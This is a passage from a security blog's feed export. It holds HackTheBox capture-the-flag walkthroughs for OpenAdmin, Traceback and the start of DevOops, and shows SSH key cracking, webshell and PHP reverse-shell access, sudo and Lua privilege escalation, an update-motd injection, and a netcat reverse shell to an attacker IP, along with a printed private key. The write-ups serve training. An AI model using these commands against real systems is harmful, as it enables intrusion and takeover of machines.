class="line">S33lgrCM4&#x2F;ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey&#x2F;ur&#x2F;4F</span><br><span class="line">FnonsEl16TZvolSt9RH&#x2F;19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD&#x2F;GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA&#x2F;MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM&#x2F;SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC&#x2F;z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7&#x2F;ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE&#x2F;bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw&#x2F;iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">&lt;&#x2F;pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;</span><br><span class="line">Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>è§£å¯†rsaå¾—åˆ°ä¸€ä¸ªå¯†ç å«<code>bloodninjas</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ python /usr/share/john/ssh2john.py joanna_rsa &gt; joanna_rsa.hash</span><br><span class="line">kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bloodninjas      (joanna_rsa)</span><br><span class="line">1g 0:00:00:16 DONE (2020-02-09 08:19) 0.06172g/s 885290p/s 885290c/s 885290C/sa6_123..*7Â¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>ç»å°è¯•è¿™ä¸ªå¯†ç å¹¶ä¸æ˜¯joannaçš„sshè¿æ¥å¯†ç ï¼Œè€Œæ˜¯åˆ©ç”¨å¯†é’¥è¿æ¥sshæ—¶å¯¹ç§é’¥çš„éªŒè¯å¯†ç ã€‚ä¹‹åè¿æ¥åˆ°joannaçš„sshï¼Œæ³¨æ„ä¸€å®šè¦å°†ç§é’¥çš„æ–‡ä»¶æƒé™è®¾ç½®ä¸º700ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ chmod 700 joanna_rsa</span><br><span class="line">kali@kali:~/Desktop$ ssh -i joanna_rsa joanna@10.10.10.171</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;joanna_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun Feb  9 14:18:59 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  1.04              Processes:             164</span><br><span class="line">  Usage of /:   49.6% of 7.81GB   Users logged <span class="keyword">in</span>:       2</span><br><span class="line">  Memory usage: 24%               IP address <span class="keyword">for</span> ens160: 10.10.10.171</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">41 packages can be updated.</span><br><span class="line">12 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Feb  9 14:17:21 2020 from 10.10.15.190</span><br><span class="line">joanna@openadmin:~$ </span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥å¾ˆç®€å•çš„æ‰¾åˆ°<code>user.txt</code>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joanna@openadmin:~$ ls -la</span><br><span class="line">total 48</span><br><span class="line">drwxr-x--- 6 joanna joanna 4096 Feb  9 14:17 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Nov 22 18:00 ..</span><br><span class="line">-rw-rw-r-- 1 joanna joanna   64 Feb  9 14:02 0</span><br><span class="line">lrwxrwxrwx 1 joanna joanna    9 Nov 22 18:02 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 joanna joanna  220 Nov 22 18:00 .bash_logout</span><br><span class="line">-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrc</span><br><span class="line">drwx------ 2 joanna joanna 4096 Nov 22 22:42 .cache</span><br><span class="line">drwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupg</span><br><span class="line">drwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .<span class="built_in">local</span></span><br><span class="line">-rw------- 1 joanna joanna   86 Feb  9 14:17 nano.save</span><br><span class="line">-rw-r--r-- 1 joanna joanna  807 Nov 22 18:00 .profile</span><br><span class="line">drwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh</span><br><span class="line">-rw-rw-r-- 1 joanna joanna   33 Nov 28 09:37 user.txt</span><br><span class="line">joanna@openadmin:~$ cat user.txt</span><br><span class="line">c9b2c[--------------]f0c81b5f</span><br></pre></td></tr></table></figure>
<p><code>sudo -l</code>å‘½ä»¤æ˜¾ç¤ºç”¨æˆ·Joannaèƒ½å¤Ÿä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œ<code>/bin/nano /opt/priv</code>ï¼Œè€Œæ— éœ€è¾“å…¥å¯†ç ã€‚ å½“çœ‹åˆ°ç”¨æˆ·å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œnanoæ—¶ï¼Œè¿™æ˜¯æœ€ç®€å•çš„åˆ©ç”¨æ–¹æ³•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joanna@openadmin:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥å¾—åˆ°/root/root.txtæ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209224305.png" alt=""></p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://decdeg.com/hackthebox-open-admin-10-10-10-171/">https://decdeg.com/hackthebox-open-admin-10-10-10-171/</a></p>
<p><a href="https://www.jianshu.com/p/9f1f9145ac3f">https://www.jianshu.com/p/9f1f9145ac3f</a></p>
<p><a href="https://xz.aliyun.com/t/3958#toc-1">https://xz.aliyun.com/t/3958#toc-1</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Traceback Walkthrough</title>
    <url>/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Traceback-Walkthrough">HTB::Traceback Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324162401.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>pspy</li>
<li>gtfobins</li>
<li>OSINT</li>
<li>SSH with public key</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Mon Mar 23 10:20:21 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.181</span><br><span class="line">Nmap scan report for 10.10.10.181</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)</span><br><span class="line">|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)</span><br><span class="line">|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Help us</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Mon Mar 23 10:21:10 2020 -- 1 IP address (1 host up) scanned in 49.24 seconds</span><br></pre></td></tr></table></figure>
<p>Meanwhile, I ran <code>gobuster</code> and <code>dirb</code> But there is anything interesting for me.</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>80 HTTP Website</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324173714.png" alt=""></p>
<p>Hintï¼š<code>Some of the best web shells that you might need ;)</code>ï¼Œ Google it</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192528.png" style="zoom:67%;" />
<p>Found a Github repo</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192614.png" style="zoom:80%;" />
<p>Test all webshell filename for url</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192715.png" style="zoom:80%;" />
<p><code>smevk.php</code> webshell works, and username is admin, password is admin.</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324194144.png" alt=""></p>
<p>Upload <a href="https://github.com/pentestmonkey/php-reverse-shell">php reverse shell script</a> through Code Injector module.</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324194928.png" alt=""></p>
<p>Now I can get a php reverse shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324195537.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">10.10.10.181: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.99] from (UNKNOWN) [10.10.10.181] 33430</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(webadmin) gid&#x3D;1000(webadmin) groups&#x3D;1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">$ cd &#x2F;home&#x2F;webadmin</span><br><span class="line">$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..</span><br><span class="line">-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc</span><br><span class="line">drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache</span><br><span class="line">drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local</span><br><span class="line">-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile</span><br><span class="line">drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh</span><br><span class="line">-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt</span><br></pre></td></tr></table></figure>
<p>åœ¨webadminçš„ä¸»ç›®å½•ä¸»è¦çœ‹ä¸¤ä¸ªæ–‡ä»¶<code>note.txt</code>å’Œ<code>.bash_history</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat note.txt</span><br><span class="line">- sysadmin -</span><br><span class="line">I have left a tool to practice Lua.</span><br><span class="line">I&#39;m sure you know where to find it.</span><br><span class="line">Contact me if you have any question.</span><br><span class="line">$ cat .bash_history</span><br><span class="line">ls -la</span><br><span class="line">sudo -l</span><br><span class="line">nano privesc.lua</span><br><span class="line">sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua </span><br><span class="line">rm privesc.lua</span><br><span class="line">logout</span><br></pre></td></tr></table></figure>
<p>åº”è¯¥æ˜¯åˆ©ç”¨<code>/home/sysadmin/luvit</code>è¿™ä¸ªå·¥å…·æ‰§è¡Œluaè„šæœ¬ï¼Œå¯ä»¥å†æ–°å»ºä¸€ä¸ª<code>privesc.lua</code>è„šæœ¬ï¼Œç„¶åæ¨¡ä»¿<code>.bash_history</code>æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; privesc.lua</span><br><span class="line">$ cat privesc.lua</span><br><span class="line">os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">$sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua</span><br><span class="line">sh: turning off NDELAY mode</span><br><span class="line"></span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1001(sysadmin) gid&#x3D;1001(sysadmin) groups&#x3D;1001(sysadmin)</span><br><span class="line">cd &#x2F;home&#x2F;sysadmin </span><br><span class="line">ls</span><br><span class="line">luvit</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>Get user flag~</p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>çœ‹äº†ä¸€ä¸‹HTB Forumä¸Šé¢ä¸€äº›å¸ˆå‚…ç»™çš„æç¤ºï¼Œç”¨pspyå·¥å…·ç›‘è§†ç³»ç»Ÿä¸­åœ¨æ‰§è¡Œçš„ç¨‹åºï¼Œå‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2273   | sleep 30 </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2272   | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2271   | </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2270   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2269   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:31 CMD: UID&#x3D;0    PID&#x3D;2275   | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm</span><br><span class="line"> &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2281   | sleep 30 </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2278   | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2277   | </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2276   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:32 CMD: UID&#x3D;0    PID&#x3D;2282   | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm</span><br><span class="line"> &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿæ¯éš”30ç§’å°±æŠŠ<code>/var/backups/.update-motd.d/</code>ä¸­çš„æ–‡ä»¶éƒ½å¤åˆ¶åˆ°<code>/etc/update-motd.d/</code>ï¼ŒGoogleä¸€ä¸‹<code>update-motd.d</code>çš„ä½œç”¨ï¼Œå‘ç°æ˜¯æ¯æ¬¡SSHç™»å½•æˆåŠŸåï¼Œä¼šæ‰§è¡Œ<code>00-header</code>æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç°åœ¨çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆç”¨SSHç™»å½•é¶æœºï¼Œæˆ‘æ‰¾äº†å¾ˆä¹…SSHçš„ç™»å½•å¯†ç ï¼Œåæ¥æ‰çªç„¶æƒ³åˆ°SSHé™¤äº†å£ä»¤ç™»å½•è¿˜å¯ä»¥å…¬é’¥ç™»å½•ï¼ŒæŠŠæœ¬æœºä¸Šçš„å…¬é’¥æ‹·è´åˆ°é¶æœºçš„<code>/home/webadmin/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­å³å¯ã€‚</p>
<blockquote>
<p>é¡ºä¾¿æŠŠSSHçš„åŸç†å¤ä¹ ä¸€ä¸‹ï¼š<a href="https://www.jianshu.com/p/33461b619d53">https://www.jianshu.com/p/33461b619d53</a></p>
</blockquote>
<p>é¶æœº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6zGx1XQHjBj5x5D+qqE+0wml2VnALfbz7D5CpexgNrpEDQTOWCEkIAl1Ftt9FNClzdNk+&#x2F;NFMWXR8dxRHzOl7aQzMa+njQOzh6VyM34YbCGuGgakDCIrsHu25dAwypvJ7Clp22faDDIw6zJxcx84Ir1XSpUeWZ4Cotk+0gVzwg</span><br><span class="line">LHbstRPxyzxROvcsesx9kd251L3&#x2F;bWJzC53oNDaSXzMBYV7sdjSlPLeD9zHJ39wr5YaEFwn0vkgPR+VAdlXAOLi98Ttr+FYMsGr8XMbJU06QKZ2ozf6RVjc6RJ5hjgIFbcxV8VCNGM6rBx5FDCZDgnbzu4ITWpWsgBBLu3JndjD+UWkeejLE4K7eR3510W&#x2F;x4zHF&#x2F;0TsZicyh&#x2F;ZJb</span><br><span class="line">ZEo+JefvVKT0WAilaJ2K7w7jDkrPhZO6TheGTDnvLqrEvHObGq70ytpZ6ippsm78&#x2F;xkwCHu4l03RMd2Zt+7elXOsA&#x2F;4WsjEvS+CxqlbtTC636+T6T4cTro2GHlO3lAq7oddq0&#x3D; kali@kali &gt;&gt; &#x2F;home&#x2F;webadmin&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">$ cd &#x2F;etc&#x2F;update-motd.d&#x2F;</span><br><span class="line">$ echo &quot;cat &#x2F;root&#x2F;root.txt&quot; &gt;&gt; 00-header</span><br></pre></td></tr></table></figure>
<p>ä¸»æœºï¼ˆè¿™ä¸¤ä¸ªæ­¥éª¤è¡”æ¥è¦å¿«ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -i id_rsa webadmin@10.10.10.181</span><br><span class="line">#################################</span><br><span class="line">-------- OWNED BY XH4H  ---------</span><br><span class="line">- I guess stuff could have been configured better ^^ -</span><br><span class="line">#################################</span><br><span class="line">Welcome to Xh4H land</span><br><span class="line"></span><br><span class="line">cf6c[---------------------------]aefc</span><br><span class="line"></span><br><span class="line">Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2</span><br></pre></td></tr></table></figure>
<p>Get root flag~</p>
<p>å¦å¤–ï¼Œè¿˜å¯ä»¥åœ¨<code>91-release-upgrade</code>å†™ä¸€ä¸ªreverse shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;tmp&#x2F;nc -e &#x2F;bin&#x2F;bash 10.10.14.194 2345</span><br><span class="line"># if the current release is under development there won&#39;t be a new one</span><br><span class="line">if [ &quot;$(lsb_release -sd | cut -d&#39; &#39; -f4)&quot; &#x3D; &quot;(development&quot; ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line">if [ -x &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd ]; then</span><br><span class="line">    exec &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/Traceback.png" alt=""></p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/">https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/</a></p>
<p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/lua/">https://gtfobins.github.io/gtfobins/lua/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::DevOops Walkthrough</title>
    <url>/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-DevOops-Walkthrough">HTB::DevOops Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200329123807.png" alt=""></p>
<h2 id="0x02-Preliminary">0x02 Preliminary</h2>
<h3 id="Python-unserialize">Python unserialize</h3>
<p><a href="https://r1dd1er.top/2019/05/21/python%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://r1dd1er.top/2019/05/21/pythonå®‰å…¨ä¹‹ååºåˆ—åŒ–/</a></p>
<p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/å…³äºPython-secçš„ä¸€äº›æ€»ç»“/</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python ååºåˆ—åŒ–æ¼æ´/</a></p>
<p><a href="http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html">http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html</a></p>
<p>é¶åœºï¼š<a href="https://github.com/vulhub/vulhub/tree/master/python/unpickle">https://github.com/vulhub/vulhub/tree/master/python/unpickle</a></p>
<h3 id="XXE-Injection">XXE Injection</h3>
<p><a href="https://ca0y1h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/20.xxeæ¼æ´åˆ©ç”¨/</a></p>
<h2 id="0x03-Tools-and-Tips">0x03 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirsearch</li>
<li>wfuzz</li>
<li>Python pickle unserialize</li>
<li>XXE read files</li>
<li>Git</li>
</ul>
<h2 id="0x04-Pentesting">0x04 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Tue Mar 24 09:04:48 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.91</span><br><span class="line">Nmap scan report for 10.10.10.91</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)</span><br><span class="line">|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)</span><br><span class="line">|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)</span><br><span class="line">5000&#x2F;tcp open  http    Gunicorn 19.7.1</span><br><span class="line">|_http-server-header: gunicorn&#x2F;19.7.1</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Mar 24 09:05:52 2020 -- 1 IP address (1 host up) scanned in 64.19 seconds</span><br></pre></td></tr></table></figure>
